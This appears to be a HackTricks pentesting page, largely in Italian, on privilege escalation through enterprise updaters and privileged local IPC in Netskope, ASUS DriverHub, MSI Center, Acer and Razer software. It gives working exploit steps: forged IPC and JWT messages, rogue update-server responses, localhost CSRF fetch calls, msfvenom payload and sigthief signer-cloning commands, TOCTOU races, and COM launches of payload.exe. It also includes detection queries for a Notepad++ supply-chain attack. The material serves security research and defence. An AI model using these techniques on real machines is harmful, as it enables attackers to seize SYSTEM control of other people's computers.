# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Questa pagina generalizza una classe di catene di Windows local privilege escalation trovate in agent enterprise endpoint e updater che espongono una superficie IPC a bassa frizione e un flusso di update privilegiato. Un esempio rappresentativo è Netskope Client per Windows < R129 (CVE-2025-0309), dove un utente con privilegi bassi può forzare l’enrollment verso un server controllato dall’attaccante e poi consegnare un MSI malevolo che il servizio SYSTEM installa.

Concetti chiave che puoi riutilizzare contro prodotti simili:
- Abuse di una localhost IPC di un servizio privilegiato per forzare re-enrollment o riconfigurazione verso un server attaccante.
- Implementare gli endpoint di update del vendor, consegnare una Trusted Root CA rogue e puntare l’updater a un package malevolo, “signed”.
- Evitare weak signer checks (CN allow-lists), optional digest flags e proprietà MSI permissive.
- Se la IPC è “encrypted”, derivare la chiave/IV da identificatori della macchina leggibili da tutti archiviati nel registry.
- Se il servizio restringe i chiamanti tramite image path/process name, iniettare in un processo allow-listed oppure avviarne uno suspended e bootstrap della tua DLL tramite un minimal thread-context patch.

---
## 1) Forzare l’enrollment verso un server attaccante tramite localhost IPC

Molti agent includono un processo UI in user-mode che comunica con un servizio SYSTEM via localhost TCP usando JSON.

Osservato in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flusso di exploit:
1) Costruire un JWT enrollment token le cui claims controllano l’host backend (ad es. AddonUrl). Usare alg=None così non è richiesta alcuna signature.
2) Inviare il messaggio IPC che invoca il comando di provisioning con il tuo JWT e tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Il servizio inizia a colpire il tuo rogue server per enrollment/config, ad esempio:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Se la verifica del caller è basata su path/name, origina la richiesta da un binary vendor allow-listed (vedi §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Una volta che il client parla con il tuo server, implementa gli endpoint attesi e indirizzalo verso un MSI dell’attacker. Sequenza tipica:

1) /v2/config/org/clientconfig → Restituisci una configurazione JSON con un intervallo dell’updater molto breve, ad esempio:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Restituisce un certificato CA PEM. Il servizio lo installa nel Local Machine Trusted Root store.
3) /v2/checkupdate → Fornisci metadata che puntano a un MSI malevolo e a una fake version.

Bypassing common checks seen in the wild:
- Signer CN allow-list: il servizio può controllare solo che il Subject CN sia uguale a “netSkope Inc” o “Netskope, Inc.”. La tua rogue CA può emettere un leaf con quel CN e firmare il MSI.
- CERT_DIGEST property: includi una benign MSI property chiamata CERT_DIGEST. Nessuna enforcement durante l'installazione.
- Optional digest enforcement: il config flag (e.g., check_msi_digest=false) disabilita la validazione crittografica extra.

Result: il servizio SYSTEM installa il tuo MSI da
C:\ProgramData\Netskope\stAgent\data\*.msi
eseguendo codice arbitrario come NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Gli attacker possono riprodurre la encryption e inviare valid encrypted commands da un standard user. General tip: se un agent improvvisamente “encrypts” il suo IPC, cerca device IDs, product GUID, install IDs sotto HKLM come materiale.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow-listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Due practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

When facing a new endpoint agent or motherboard “helper” suite, a quick workflow is usually enough to tell whether you are looking at a promising privesc target:

1) Enumerate loopback listeners and map them back to vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Enumera le named pipes candidate:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Estrarre i dati di routing backed dal registro usati dai server IPC basati su plugin:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Estrai prima dal client in user-mode i nomi degli endpoint, le chiavi JSON e gli ID dei comandi. I frontend Electron/.NET impacchettati spesso rivelano l’intero schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Cerca il reale trust predicate, non solo il code path che alla fine avvia il processo:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patterns worth prioritizing:
- `CryptQueryObject`/certificate parsing without `WinVerifyTrust` di solito significa che “certificate exists” è stato trattato come “certificate is trusted”, consentendo certificate cloning o altri fake-signer tricks.
- Controlli di substring/suffix su `Origin`, `Referer`, download URLs, process names, o signer CNs non sono autenticazione. `contains(".vendor.com")` è di solito sfruttabile con domini lookalike controllati dall’attaccante.
- Se la GUI a basso privilegio decide “the file is trusted” e il broker SYSTEM si limita a consumare quel risultato, patchare o reimplementare la DLL/JS lato client spesso bypassa l’intero boundary (split validation stile Razer).
- Se il broker copia un payload in `%TEMP%`/`C:\Windows\Temp` e poi lo valida o lo schedula da quel path, testa subito finestre di TOCTOU replacement e sibling plugin modules che espongono wrapper alternativi `ExecuteTask()` con controlli più deboli.

Per target con molto uso di named-pipe, PipeViewer è un modo rapido per individuare weak DACLs e pipe raggiungibili da remoto prima di iniziare a fare reversing del protocol in profondità.

Se il target autentica i chiamanti solo tramite PID, image path, o process name, consideralo un speed bump più che un boundary: iniettare nel client legittimo, o fare la connection da un processo allow-listed, spesso basta a soddisfare i controlli del server. Per named pipes in particolare, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) copre il primitive in maggiore dettaglio.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Practical flow:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Anche la PowerShell CLI mostrata qui sotto ha successo quando l'header Origin viene spoofato con il valore fidato:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Qualsiasi visita del browser al sito dell’attaccante diventa quindi una local CSRF a 1-click (o 0-click tramite `onload`) che avvia un helper SYSTEM.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` scarica eseguibili arbitrari definiti nel body JSON e li memorizza in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validazione dell’URL di download riusa la stessa logica substring, quindi `http://updates.asus.com.attacker.tld:8000/payload.exe` viene accettato. Dopo il download, ADU.exe controlla solo che il PE contenga una signature e che la stringa Subject corrisponda ad ASUS prima di eseguirlo – niente `WinVerifyTrust`, nessuna chain validation.

Per weaponize il flusso:
1) Crea un payload (ad es. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clona il signer di ASUS dentro di esso (ad es. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Ospita `pwn.exe` su un dominio simile a `.asus.com` e attiva UpdateApp tramite la browser CSRF sopra.

Poiché sia i filtri Origin che URL sono basati su substring e il controllo del signer confronta solo stringhe, DriverHub scarica ed esegue il binario dell’attaccante nel suo contesto elevato.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Il servizio SYSTEM di MSI Center espone un protocollo TCP in cui ogni frame è `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Il componente core (Component ID `0f 27 00 00`) include `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Il suo handler:
1) Copia l’eseguibile fornito in `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la signature tramite `CS_CommonAPI.EX_CA::Verify` (il certificate subject deve essere “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve avere successo).
3) Crea una scheduled task che esegue il file temporaneo come SYSTEM con argomenti controllati dall’attaccante.

Il file copiato non è bloccato tra la verifica e `ExecuteTask()`. Un attaccante può:
- Inviare Frame A che punta a un binario legittimo firmato da MSI (garantisce che il controllo della signature passi e che il task venga accodato).
- Gareggiare con messaggi Frame B ripetuti che puntano a un payload malevolo, sovrascrivendo `MSI Center SDK.exe` subito dopo il completamento della verifica.

Quando lo scheduler si attiva, esegue il payload sovrascritto come SYSTEM nonostante abbia validato il file originale. Uno sfruttamento affidabile usa due goroutine/thread che martellano `CMD_AutoUpdateSDK` finché la finestra TOCTOU non viene vinta.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Ogni plugin/DLL caricato da `MSI.CentralServer.exe` riceve un Component ID memorizzato sotto `HKLM\SOFTWARE\MSI\MSI_CentralServer`. I primi 4 byte di un frame selezionano quel componente, permettendo agli attaccanti di instradare comandi verso moduli arbitrari.
- I plugin possono definire i propri task runner. `Support\API_Support.dll` espone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e chiama direttamente `API_Support.EX_Task::ExecuteTask()` con **nessuna signature validation** – qualsiasi utente locale può puntarlo a `C:\Users\<user>\Desktop\payload.exe` e ottenere esecuzione SYSTEM in modo deterministico.
- Sniffare il loopback con Wireshark o instrumentare i binari .NET in dnSpy rivela rapidamente la mappatura Component ↔ command; client Go/ Python personalizzati possono quindi riprodurre i frame.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) espone `\\.\pipe\treadstone_service_LightMode`, e il suo discretionary ACL consente client remoti (ad es. `\\TARGET\pipe\treadstone_service_LightMode`). Inviare il command ID `7` con un file path invoca la routine del servizio che avvia processi.
- La client library serializza un byte terminatore magico (113) insieme agli argomenti. L’instrumentazione dinamica con Frida/`TsDotNetLib` (vedi [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) per suggerimenti sull’instrumentazione) mostra che l’handler nativo mappa questo valore su un `SECURITY_IMPERSONATION_LEVEL` e un integrity SID prima di chiamare `CreateProcessAsUser`.
- Sostituire 113 (`0x71`) con 114 (`0x72`) porta nel branch generico che mantiene il token SYSTEM completo e imposta un high-integrity SID (`S-1-16-12288`). Il binario avviato quindi gira come SYSTEM senza restrizioni, sia localmente che cross-machine.
- Combinalo con il flag di installazione esposto (`Setup.exe -nocheck`) per avviare ACC anche su VM di laboratorio e usare la pipe senza hardware del vendor.

Questi bug IPC evidenziano perché i servizi localhost devono imporre mutual authentication (ALPC SIDs, filtri `ImpersonationLevel=Impersonation`, token filtering) e perché ogni helper “run arbitrary binary” di ogni modulo deve condividere le stesse verifiche del signer.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 ha aggiunto un altro pattern utile a questa famiglia: un utente a basso privilegio può chiedere a un helper COM di lanciare un processo tramite `RzUtility.Elevator`, mentre la decisione di trust viene delegata a una DLL user-mode (`simple_service.dll`) invece di essere applicata in modo robusto all’interno del boundary privilegiato.

Percorso di sfruttamento osservato:
- Istanzia l’oggetto COM `RzUtility.Elevator`.
- Chiama `LaunchProcessNoWait(<path>, "", 1)` per richiedere un avvio elevato.
- Nel PoC pubblico, il gate della PE-signature dentro `simple_service.dll` viene patchato prima di inviare la richiesta, consentendo di avviare un eseguibile arbitrario scelto dall’attaccante.

Chiamata PowerShell minima:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Takeaway generale: quando fai reversing di suite “helper”, non fermarti a localhost TCP o named pipes. Controlla le COM classes con nomi come `Elevator`, `Launcher`, `Updater` o `Utility`, poi verifica se il servizio privilegiato valida davvero il binary target oppure si fida solo di un risultato calcolato da una client DLL in user-mode patchabile. Questo pattern va oltre Razer: qualsiasi design split in cui il broker ad alta privilege consuma una decisione allow/deny dal lato a bassa privilege è un candidato surface per privesc.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Tra giugno 2025 e dicembre 2025, attacker che hanno compromesso l’infrastruttura di hosting dietro il flusso di update di Notepad++ hanno servito in modo selettivo manifest maliziosi a vittime scelte. I vecchi updater basati su WinGUp non verificavano completamente l’autenticità degli update, quindi una risposta XML ostile poteva reindirizzare i client verso URL controllati dall’attacker. Poiché il client accettava contenuto HTTPS senza imporre sia una trusted certificate chain sia una valid PE signature sull’installer scaricato, le vittime scaricavano ed eseguivano un `update.exe` NSIS trojanizzato.

Operational flow (no local exploit required):
1. **Infrastructure interception**: comprometti CDN/hosting e rispondi ai controlli di update con metadata dell’attacker che puntano a una malicious download URL.
2. **Trojanized NSIS**: l’installer scarica/esegue un payload e abusa di due execution chains:
- **Bring-your-own signed binary + sideload**: include il `BluetoothService.exe` firmato di Bitdefender e rilascia un `log.dll` malevolo nel suo search path. Quando il binary firmato viene eseguito, Windows fa sideload di `log.dll`, che decifra e carica in modo reflective il backdoor Chrysalis (protetto da Warbird + API hashing per ostacolare il rilevamento statico).
- **Scripted shellcode injection**: NSIS esegue uno script Lua compilato che usa Win32 APIs (ad esempio, `EnumWindowStationsW`) per iniettare shellcode e avviare Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Imporre la **verifica di certificate + signature** dell’installer scaricato (pin del signer del vendor, rifiutare CN/chain non corrispondenti) e firmare il manifest di update stesso (ad esempio, XMLDSig). Bloccare i redirect controllati dal manifest se non validati.
- Trattare **BYO signed binary sideloading** come un pivot di detection post-download: alert quando un EXE firmato del vendor carica una DLL il cui nome proviene da fuori del suo canonical install path (ad esempio, Bitdefender che carica `log.dll` da Temp/Downloads) e quando un updater rilascia/esegue installer da temp con signature non vendor.
- Monitorare gli **artifacts specifici del malware** osservati in questa chain (utili come pivot generici): mutex `Global\Jdhfv_1.0.1`, scritture anomale di `gup.exe` in `%TEMP%`, e stadi di shellcode injection guidati da Lua.
- Notepad++ ha risposto rafforzando WinGUp in v8.8.9 e versioni successive: l’XML restituito è ora firmato (XMLDSig), e le build più recenti impongono la verifica di certificate + signature dell’installer scaricato invece di fidarsi solo del transport.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> launching a non-Notepad++ installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Questi pattern si generalizzano a qualsiasi updater che accetta manifest non firmati o non riesce a fare il pin dei signer dell’installer—network hijack + malicious installer + BYO-signed sideloading consente remote code execution sotto le mentite spoglie di aggiornamenti “trusted”.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
